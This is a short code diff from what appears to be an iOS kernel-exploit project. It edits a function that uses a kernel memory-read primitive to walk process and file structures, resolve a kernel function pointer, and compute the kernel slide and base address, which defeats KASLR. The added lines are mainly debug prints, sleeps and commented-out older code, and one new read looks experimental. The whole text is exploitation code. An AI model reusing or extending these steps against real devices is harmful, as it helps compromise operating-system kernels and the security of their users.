@@ -85,19 +85,59 @@ void perf_init(struct kfd* kfd)
 
 void perf_run(struct kfd* kfd)
 {
+    // average vftableware
+    
     assert(kfd->info.kaddr.current_proc);
+    
+    print_success("passed current_proc assert");
+    sleep(1);
+    
+    /*
+    
+    struct fileproc* fp_struct = (struct fileproc*)fileproc;
+    print_message("got fp_glob from fileproc struct: 0x%llx", unsign_kaddr(fp_struct->fp_glob));
+    sleep(1);
+    
+    u64 fp_glob = fp_struct->fp_glob;
+     
+    */
+    
+    u64 fp_glob = kget_u64(fileproc__fp_glob, kfd->info.kaddr.current_proc);
+    print_success("WORKED!!!!!!!! fp_glob = %llx", unsign_kaddr(fp_glob));
+    sleep(1);
+    
+    /*
+    
     u64 fd_ofiles = kget_u64(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
+    
     u64 fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
+    print_success("got fileproc kaddr: 0x%llx", fileproc_kaddr);
+    sleep(1);
+    
     u64 fileproc = 0;
+    
     kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
+    print_success("got past fileproc read: 0x%llx", fileproc);
+    sleep(1);
+    
     u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
+    print_success("got fp_glob kaddr: 0x%llx", fp_glob_kaddr);
+    sleep(1);
+    
     u64 fp_glob = 0;
+    
     kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
+    print_success("got past fp_glob read: = 0x%llx", fp_glob);
+    sleep(1);
+     
+     */
+    
     u64 fg_ops = kget_u64(fileglob__fg_ops, unsign_kaddr(fp_glob));
     u64 fo_kqfilter =  kget_u64(fileops__fo_kqfilter, unsign_kaddr(fg_ops));
     u64 vn_kqfilter = unsign_kaddr(fo_kqfilter);
     u64 kernel_slide = vn_kqfilter - kfd_offset(kernelcache__vn_kqfilter);
     u64 kernel_base = kfd_offset(kernelcache__kernel_base) + kernel_slide;
+    
     kfd->perf.kernel_slide = kernel_slide;
     print_x64(kfd->perf.kernel_slide);
 
